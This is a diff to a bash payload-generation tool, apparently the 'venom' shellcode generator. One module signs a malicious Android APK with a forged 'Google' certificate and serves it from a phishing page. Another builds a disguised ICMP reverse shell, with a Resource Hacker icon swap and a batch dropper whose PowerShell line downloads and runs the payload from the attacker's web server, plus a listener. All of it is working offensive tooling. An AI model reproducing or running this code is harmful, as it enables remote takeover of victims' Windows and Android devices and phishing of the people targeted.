@@ -7320,7 +7320,7 @@ echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Do you wish to sign $N4m.apk App
 if [ "$cert" = "y" ] || [ "$cert" = "Y" ] || [ "$cert" = "yes" ]; then
    imp=`which keytool`
    if [ "$?" -eq "0" ]; then
-      echo "[☠] Signing $N4m.apk using keytool .."
+      echo "[☠] Signing $N4m.apk using keytool ..";sleep 1
       echo "[☠] keytool install found (dependencie)..";sleep 1
       cd $IPATH/output
       imp=`which zipalign`
@@ -7341,13 +7341,13 @@ if [ "$cert" = "y" ] || [ "$cert" = "Y" ] || [ "$cert" = "yes" ]; then
       echo "- sign our apk with an SSL certificate (google). We just need to manually input 3"
       echo "- times a SecretKey (password) when asked further head."
       echo "---"
-      keytool -genkey -v -keystore $IPATH/output/my-release-key.Keystore -alias $N4m -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android, OU=Google, O=Google, L=US, ST=NY, C=US";sleep 1;echo ""
-      jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $IPATH/output/my-release-key.Keystore $N4m.apk $N4m;sleep 1;echo ""
+      keytool -genkey -v -keystore $IPATH/output/my-release-key.Keystore -alias $N4m -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android, OU=Google, O=Google, L=US, ST=NY, C=US";echo "";sleep 2
+      jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $IPATH/output/my-release-key.Keystore $N4m.apk $N4m;sleep 2;echo ""
       zipalign -v 4 $IPATH/output/$N4m.apk $IPATH/output/done.apk;sleep 1;echo ""
       mv done.apk $Nam.apk > /dev/null 2>&1
       cd $IPATH
    else
-      echo "${RedF}[x]${white} Abort, ${RedF}keytool${white} packet not found.."
+      echo "${RedF}[x]${white} Abort, ${RedF}keytool${white} packet not found..";sleep 1
       echo "[☠] Please Install 'keytool' packet before continue ..";sleep 3
       sh_android_menu # <--- return to android/ios menu
    fi
@@ -7386,14 +7386,14 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
       # edit files nedded
-      echo "[☠] Porting ALL files to apache2 webroot..."
+      echo "[☠] Porting ALL files to apache2 webroot...";sleep 1
       cd $IPATH/templates/phishing
       cp $InJEc12 mega[bak].html
       sed "s|NaM3|$N4m.apk|g" mega.html > copy.html
       mv copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.apk $ApAcHe/$N4m.apk > /dev/null 2>&1
-      echo "[☠] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!";sleep 1
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -11244,19 +11244,41 @@ fi
 
 
 
-# --------------------
-# ICMP (ping) SHELL
-# --------------------
+# ------------------------------------
+# ICMP (ping) REVERSE SHELL
+# original project by: @Daniel Compton
+# -
+# This module introduces the changing of payload icon,
+# payload final name, port all files to apache2 webroot,
+# and builds dropper.bat (to download/exec our payload).
+# ------------------------------------
 sh_icmp_shell () {
-# get user input to build shellcode
-echo "[☠] Enter master (server) settings!"
-lhost=$(zenity --title="☠ Enter LHOST (local) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
-target=$(zenity --title="☠ Enter RHOST (target) ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
+# get user input to build agent
+echo "[☠] Enter module settings!"
+lhost=$(zenity --title="☠ Enter LHOST (local ip) ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+target=$(zenity --title="☠ Enter RHOST (target ip) ☠" --text "example: 192.168.1.72" --entry --width 300) > /dev/null 2>&1
 N4m=$(zenity --title="☠ Enter Dropper FileName ☠" --text "example: dropper" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Upload Path (target) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
-if [ -z "$rpath" ]; then
-rpath="%tmp%"
+slave=$(zenity --title="☠ Enter Payload FileName ☠" --text "example: icmpsh\nRemark: DONT start the name with [ f ] character .." --entry --width 300) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
+
+## setting default values in case user have skip this ..
+if [ -z "$target" ]; then
+   echo ${RedF}[x] ERROR:${white} We must provide the target ip address ..${Reset};
+   sleep 3; clear; sh_exit
 fi
+if [ -z "$lhost" ]; then
+   lhost="$IP"
+fi
+if [ -z "$N4m" ]; then
+   N4m="dropper"
+fi
+if [ -z "$slave" ]; then
+   slave="icmpsh"
+fi
+if [ -z "$rpath" ]; then
+   rpath="%tmp%"
+fi
+
 
 # display final settings to user
 cat << !
@@ -11265,35 +11287,50 @@ cat << !
     ╔─────────────────────
     | LHOST  : $lhost
     | TARGET : $target
-    | UPLOAD : $rpath\icmpsh.exe
+    | UPLOAD : $rpath\\$slave.exe
     | FORMAT : ICMP (ping) Reverse Shell
     |_DISCLOSURE: @Daniel Compton
 
 !
 sleep 2
 ## Disable ICMP ping replies
+echo "[☠] Checking ICMP replies status ..";sleep 1
 LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
 if [ "$LOCALICMP" -eq 0 ]; then 
-   echo "${RedF}[x]${white} ICMP Replies are enabled (disable temporarily)${white}"
+   echo "${RedF}[x]${white} ICMP Replies enabled (disable temporarily)${white}"
    sysctl -w net.ipv4.icmp_echo_ignore_all=1 > /dev/null 2>&1
    ICMPDIS="disabled"
+fi
+
+
+## Resource Hacker - change payload icon
+cp $IPATH/bin/icmpsh/icmpsh.exe $IPATH/output/icmpsh.exe > /dev/nul 2>&1
+RhI="$H0m3/.wine/drive_c/Program Files/Resource Hacker/ResourceHacker.exe"
+if [ "$ArCh" = "x64" ]; then
+   RhI="$H0m3/.wine/drive_c/Program Files (x86)/Resource Hacker/ResourceHacker.exe"
+fi
+if [ -f "$RhI" ]; then
+   echo "[☠] Resource Hacker - changing $slave.exe icon ..";sleep 1
+   xterm -T "VENOM - RH change binary icon" -geometry 110x23 -e "$arch \"$RhI\" -open \"$IPATH/output/icmpsh.exe\" -save \"$IPATH/output/$slave.exe\" -action addskip -res \"$IPATH/bin/icons/Windows-black.ico\" -mask ICONGROUP,MAINICON, && sleep 1"
 fi
 
 
 ## Build batch dropper
 echo "[☠] Building batch dropper: $N4m.bat ..";sleep 2
 echo "@echo off" > $IPATH/output/$N4m.bat
-echo "powershell -w 1 -C (new-Object Net.WebClient).DownloadFile('http://$IP/icmpsh.exe', '$rpath\\icmpsh.exe') && start $rpath\\icmpsh.exe -t $IP -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
+echo "powershell -w 1 -C (new-Object Net.WebClient).DownloadFile('http://$IP/$slave.exe', '$rpath\\$slave.exe') && start $rpath\\$slave.exe -t $IP -d 500 -b 30 -s 128" >> $IPATH/output/$N4m.bat
 echo "exit" >> $IPATH/output/$N4m.bat
 
 
-## Copy files to apache2 webroot
+## Copy ALL files to apache2 webroot
 echo "[☠] Porting ALL files to apache2 webroot ..";sleep 2
-cp $IPATH/bin/icmpsh/icmpsh.exe $ApAcHe/icmpsh.exe > /dev/nul 2>&1
+cp $IPATH/output/icmpsh.exe $ApAcHe/$slave.exe > /dev/nul 2>&1 
+cp $IPATH/output/$slave.exe $ApAcHe/$slave.exe > /dev/nul 2>&1
 cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat > /dev/nul 2>&1
 
 
 ## Print attack vector on terminal
+echo "[☠] Starting apache2 webserver ..";sleep 1
 echo "---"
 echo "- SEND THE URL GENERATED TO TARGET HOST"
 echo "- ATTACK VECTOR: http://$IP/$N4m.bat"
@@ -11304,19 +11341,21 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "python icmpsh_m.py $IP $
 cd $IPATH
 
 
-## Exit script execution
+## Enable ICMP ping replies
+# ONLY IF.. they have been disabled before. 
 if [ "$ICMPDIS" = "disabled" ]; then
-   echo "${white}[${GreenF}✔${white}] Enabling Local ICMP Replies again.${white}";sleep 2
+   echo "${white}[${GreenF}✔${white}] Enabling Local ICMP Replies again ..${white}";sleep 2
    sysctl -w net.ipv4.icmp_echo_ignore_all=0 > /dev/null 2>&1
 fi
 
 
 ## Clean recent files
-echo "[☠] Cleanning temp generated files...";sleep 2
+echo "[☠] Cleanning temp generated files ..";sleep 2
+rm $IPATH/output/icmpsh.exe > /dev/nul 2>&1
 rm $ApAcHe/$N4m.bat > /dev/nul 2>&1
-rm $ApAcHe/icmpsh.exe > /dev/nul 2>&1
+rm $ApAcHe/$slave.exe > /dev/nul 2>&1
 cd $IPATH
-zenity --title="☠ ICMP (ping) Reverse Shell ☠" --text "REMARK:\nRemmenber to delete 'icmpsh.exe'\nslave (client) from target system." --info --width 350 > /dev/null 2>&1
+zenity --title="☠ ICMP (ping) Reverse Shell ☠" --text "REMARK:\nRemmenber to delete '$slave.exe'\nslave (client) from target system." --info --width 350 > /dev/null 2>&1
 }
 
 
@@ -12538,8 +12577,9 @@ cat << !
     | DESCRIPTION        : ICMP (ping) Reverse Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | AGENT EXTENSION    : EXE
-    | LAUNCHER EXTENSION : BAT
+    | DROPPER EXTENSION  : BAT
     | AGENT EXECUTION    : http://$IP/dropper.bat
+    | DISCLOSURE BY      : @Daniel Compton (icmpsh.exe)
 
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
@@ -12662,7 +12702,7 @@ cat << !
     | TARGET SYSTEMS     : Android
     | SHELLCODE FORMAT   : DALVIK
     | AGENT EXTENSION    : APK
-    | AGENT EXECUTION    : sudo ./agent.apk
+    | AGENT EXECUTION    : Android appl install
     | DETECTION RATIO    : https://goo.gl/dy6bkF
 
     AGENT Nº2:
